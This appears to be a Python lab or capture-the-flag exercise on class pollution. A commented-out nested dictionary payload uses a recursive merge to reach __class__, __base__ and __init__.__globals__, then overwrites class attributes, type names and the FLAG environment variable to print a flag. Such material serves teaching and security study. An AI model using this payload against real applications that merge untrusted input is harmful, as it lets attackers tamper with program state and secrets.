from myPackage.utils import *
from myPackage import User, Person
import os

# change here
injection = {} 
# end of change

'''
injection = {
    '__class__' : 
    {   
        '__qualname__':'Permanent Pollution #4', # change the output of type(objectOfUser)
        '__base__':{
            '__qualname__': 'Permanent Pollution #4', # change the output of type(objectOfPerson)
            'target1' : 'Permanent Pollution #1', # change static (class) variable, target1
            '__init__': {
                '__globals__': {
                    'os':{
                        'environ' : {
                            'FLAG' : 'Permanent Pollution #5' # change environment variable
                        }
                    }
                }
            }

        }
        
    },
    'target2' : 'Temporary Pollution #2', # change instance variable target2
    'target3' : 'Temporary Pollution #3' # change instance variable target3
}
'''


abc = User("Try to change me")
os.environ['FLAG'] = 'false'
merge(injection, abc)

# change here
print(abc.__class__)
# end of change

print(abc)
print("Target 1: ",abc.target1)
print("Target 2: ",abc.target2)
print("Target 3: ",abc.target3)

nextUser = User("Victim")
print(nextUser)
print("Target 1: ",nextUser.target1)
print("Target 2: ",nextUser.target2)
print("Target 3: ",nextUser.target3)

nextPerson = Person("Hopeless victim")
print(nextPerson)
print("Target 1: ",nextPerson.target1)

print(type(nextUser)==type(nextPerson)) # Although both outputs '<class 'myPackage.Permanent Pollution #4'>', this will show false

if os.environ['FLAG'] != 'false':
    print("FLAG{DASDASD}")